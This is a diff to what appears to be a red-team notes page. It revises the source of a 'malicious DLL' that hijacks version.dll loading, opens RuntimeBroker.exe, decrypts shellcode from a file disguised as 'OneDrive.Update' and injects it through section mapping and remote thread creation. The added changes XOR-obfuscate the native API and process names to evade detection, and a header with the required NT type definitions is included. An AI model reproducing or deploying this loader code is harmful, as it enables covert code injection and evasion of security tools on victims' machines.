@@ -34,7 +34,7 @@ with open('shellcode.bin', 'rb') as f:
 	plaintext = f.read()
 
 print('key[] = { 0x' + ',0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
-with open('enc', 'wb') as f:
+with open('OneDrive.Update', 'wb') as f:
 	f.write(aesenc(plaintext, KEY))
 ```
 {% endcode %}
@@ -48,6 +48,8 @@ Cmd > move output_version\tmp1F94.dll C:\out\vresion.dll
 
 Compile a malicious DLL (stolen from [injectopi](https://github.com/peperunas/injectopi/tree/master/CreateSection)):
 
+{% tabs %}
+{% tab title="Source" %}
 {% code title="dllmain.cpp" %}
 ```cpp
 #include "pch.h"
@@ -62,29 +64,50 @@ Compile a malicious DLL (stolen from [injectopi](https://github.com/peperunas/in
 #define _CRT_SECURE_NO_DEPRECATE
 #pragma warning (disable : 4996)
 
-/*
-...pragma export redirections from version_pragma.c...
-*/
+// ...pragma export redirections from version_pragma.c...
+
+void XOR(char* data, size_t data_len) {
+    const char key[] = "opzlxkncgtoqapweldg";
+
+    int j = 0;
+    for (int i = 0; i < data_len; i++) {
+        if (j == sizeof(key) - 1) j = 0;
+        data[i] = data[i] ^ key[j];
+        j++;
+    }
+}
 
 BOOL LoadNtdllFunctions() {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
 
-    ZwOpenProcess = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))GetProcAddress(ntdll, "ZwOpenProcess");
+    char ZwOpenProcess_str[] = { 0x35,0x07,0x35,0x1c,0x1d,0x05,0x3e,0x11,0x08,0x17,0x0a,0x02,0x12,0x00 };
+    XOR((char*)ZwOpenProcess_str, 13);
+    ZwOpenProcess = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))GetProcAddress(ntdll, ZwOpenProcess_str);
     if (ZwOpenProcess == NULL) return FALSE;
 
-    ZwCreateSection = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))GetProcAddress(ntdll, "ZwCreateSection");
+    char ZwCreateSection_str[] = { 0x35,0x07,0x39,0x1e,0x1d,0x0a,0x1a,0x06,0x34,0x11,0x0c,0x05,0x08,0x1f,0x19,0x00 };
+    XOR((char*)ZwCreateSection_str, 15);
+    ZwCreateSection = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))GetProcAddress(ntdll, ZwCreateSection_str);
     if (ZwCreateSection == NULL) return FALSE;
 
-    NtMapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))GetProcAddress(ntdll, "ZwMapViewOfSection");
-    if (NtMapViewOfSection == NULL) return FALSE;
+    char ZwMapViewOfSection_str[] = { 0x35,0x07,0x37,0x0d,0x08,0x3d,0x07,0x06,0x10,0x3b,0x09,0x22,0x04,0x13,0x03,0x0c,0x03,0x0a,0x00 };
+    XOR((char*)ZwMapViewOfSection_str, 18);
+    ZwMapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))GetProcAddress(ntdll, ZwMapViewOfSection_str);
+    if (ZwMapViewOfSection == NULL) return FALSE;
 
-    ZwCreateThreadEx = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID))GetProcAddress(ntdll, "ZwCreateThreadEx");
+    char ZwCreateThreadEx_str[] = { 0x35,0x07,0x39,0x1e,0x1d,0x0a,0x1a,0x06,0x33,0x1c,0x1d,0x14,0x00,0x14,0x32,0x1d,0x00 };
+    XOR((char*)ZwCreateThreadEx_str, 16);
+    ZwCreateThreadEx = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID))GetProcAddress(ntdll, ZwCreateThreadEx_str);
     if (ZwCreateThreadEx == NULL) return FALSE;
 
-    NtDelayExecution = (NTSTATUS(NTAPI*)(BOOL, PLARGE_INTEGER))GetProcAddress(ntdll, "ZwDelayExecution");
-    if (NtDelayExecution == NULL) return FALSE;
+    char ZwDelayExecution_str[] = { 0x35,0x07,0x3e,0x09,0x14,0x0a,0x17,0x26,0x1f,0x11,0x0c,0x04,0x15,0x19,0x18,0x0b,0x00 };
+    XOR((char*)ZwDelayExecution_str, 16);
+    ZwDelayExecution = (NTSTATUS(NTAPI*)(BOOL, PLARGE_INTEGER))GetProcAddress(ntdll, ZwDelayExecution_str);
+    if (ZwDelayExecution == NULL) return FALSE;
 
-    ZwClose = (NTSTATUS(NTAPI*)(HANDLE))GetProcAddress(ntdll, "ZwClose");
+    char ZwClose_str[] = { 0x35,0x07,0x39,0x00,0x17,0x18,0x0b };
+    XOR((char*)ZwClose_str, 7);
+    ZwClose = (NTSTATUS(NTAPI*)(HANDLE))GetProcAddress(ntdll, ZwClose_str);
     if (ZwClose == NULL) return FALSE;
 
     return TRUE;
@@ -141,21 +164,25 @@ DWORD WINAPI Run(LPVOID lpParameter) {
     if (LoadNtdllFunctions() == FALSE)
         return -1;
 
-    HANDLE hProc = GetProcHandlebyName("RuntimeBroker.exe");
+    char RuntimeBroker_str[] = { 0x3d,0x05,0x14,0x18,0x11,0x06,0x0b,0x21,0x15,0x1b,0x04,0x14,0x13,0x5e,0x12,0x1d,0x09,0x00 };
+    XOR((char*)RuntimeBroker_str, 17);
+    HANDLE hProc = GetProcHandlebyName(RuntimeBroker_str);
     if (hProc == NULL)
         return -1;
 
     FILE* fp;
     size_t shellcodeSize;
     unsigned char* shellcode;
-    fp = fopen("OneDrive.Update", "rb");
+    char OneDriveUpdate_str[] = { 0x20,0x1e,0x1f,0x28,0x0a,0x02,0x18,0x06,0x49,0x21,0x1f,0x15,0x00,0x04,0x12,0x00 };
+    XOR((char*)OneDriveUpdate_str, 15);
+    fp = fopen(OneDriveUpdate_str, "rb");
     fseek(fp, 0, SEEK_END);
     shellcodeSize = ftell(fp);
     fseek(fp, 0, SEEK_SET);
     shellcode = (unsigned char*)malloc(shellcodeSize);
     fread(shellcode, shellcodeSize, 1, fp);
 
-    char key[] = { 0x31,0x33,0x33,0x37 };
+    char key[] = { 0x13,0x33,0x33,0x37 };
     AESDecrypt((char*)shellcode, shellcodeSize, key, sizeof(key));
 
     HANDLE hSection = NULL;
@@ -167,18 +194,18 @@ DWORD WINAPI Run(LPVOID lpParameter) {
         return -1;
 
     PVOID pLocalView = NULL, pRemoteView = NULL;
-    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE)) != STATUS_SUCCESS)
+    if ((status = ZwMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE)) != STATUS_SUCCESS)
         return -1;
 
     memcpy(pLocalView, shellcode, shellcodeSize);
 
-    if ((status = NtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
+    if ((status = ZwMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
         return -1;
 
     LARGE_INTEGER interval;
     interval.QuadPart = -1 * (int)(4270 * 10000.0f);
 
-    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS)
+    if ((status = ZwDelayExecution(TRUE, &interval)) != STATUS_SUCCESS)
         return -1;
 
     HANDLE hThread = NULL;
@@ -188,7 +215,7 @@ DWORD WINAPI Run(LPVOID lpParameter) {
     ResumeThread(hThread);
 
     interval.QuadPart = -1 * (int)(4270 * 10000.0f);
-    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS)
+    if ((status = ZwDelayExecution(TRUE, &interval)) != STATUS_SUCCESS)
         return -1;
 
     return 0;
@@ -214,6 +241,98 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 }
 ```
 {% endcode %}
+{% endtab %}
+{% tab title="Include" %}
+{% code title="CreateSection.h" %}
+```cpp
+#pragma once
+#include <Windows.h>
+#include <stdio.h>
+
+#if !defined NTSTATUS
+typedef LONG NTSTATUS;
+#endif
+
+#define STATUS_SUCCESS 0
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == STATUS_SUCCESS)
+
+#if !defined PROCESSINFOCLASS
+typedef LONG PROCESSINFOCLASS;
+#endif
+
+#if !defined PPEB
+typedef struct _PEB* PPEB;
+#endif
+
+#if !defined PROCESS_BASIC_INFORMATION
+typedef struct _PROCESS_BASIC_INFORMATION {
+    PVOID Reserved1;
+    PPEB PebBaseAddress;
+    PVOID Reserved2[2];
+    ULONG_PTR UniqueProcessId;
+    PVOID Reserved3;
+} PROCESS_BASIC_INFORMATION;
+#endif;
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef struct _CLIENT_ID
+{
+    PVOID UniqueProcess;
+    PVOID UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+        (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
+        (p)->RootDirectory = r;                           \
+        (p)->Attributes = a;                              \
+        (p)->ObjectName = n;                              \
+        (p)->SecurityDescriptor = s;                      \
+        (p)->SecurityQualityOfService = NULL;             \
+        }
+
+NTSTATUS(NTAPI* ZwCreateSection)
+(_Out_ PHANDLE SectionHandle, _In_ ACCESS_MASK DesiredAccess,
+    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+    _In_opt_ PLARGE_INTEGER MaximumSize, _In_ ULONG SectionPageProtection,
+    _In_ ULONG AllocationAttributes, _In_opt_ HANDLE FileHandle);
+
+NTSTATUS(NTAPI* ZwMapViewOfSection)
+(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle,
+    _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize,
+    _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize,
+    _In_ DWORD InheritDisposition, _In_ ULONG AllocationType,
+    _In_ ULONG Win32Protect);
+
+NTSTATUS(NTAPI* ZwCreateThreadEx)
+(_Out_ PHANDLE ThreadHandle, _In_ ACCESS_MASK DesiredAccess,
+    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ProcessHandle,
+    _In_ PVOID StartRoutine, _In_opt_ PVOID Argument, _In_ ULONG CreateFlags,
+    _In_opt_ ULONG_PTR ZeroBits, _In_opt_ SIZE_T StackSize,
+    _In_opt_ SIZE_T MaximumStackSize, _In_opt_ PVOID AttributeList);
+
+NTSTATUS(NTAPI* ZwUnmapViewOfSection)(_In_ HANDLE ProcessHandle, _In_opt_ PVOID BaseAddress);
+NTSTATUS(NTAPI* ZwClose)(_In_ HANDLE Handle);
+NTSTATUS(NTAPI* ZwOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
+NTSTATUS(NTAPI* ZwDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval);
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
 
 Create a malicious link:
 
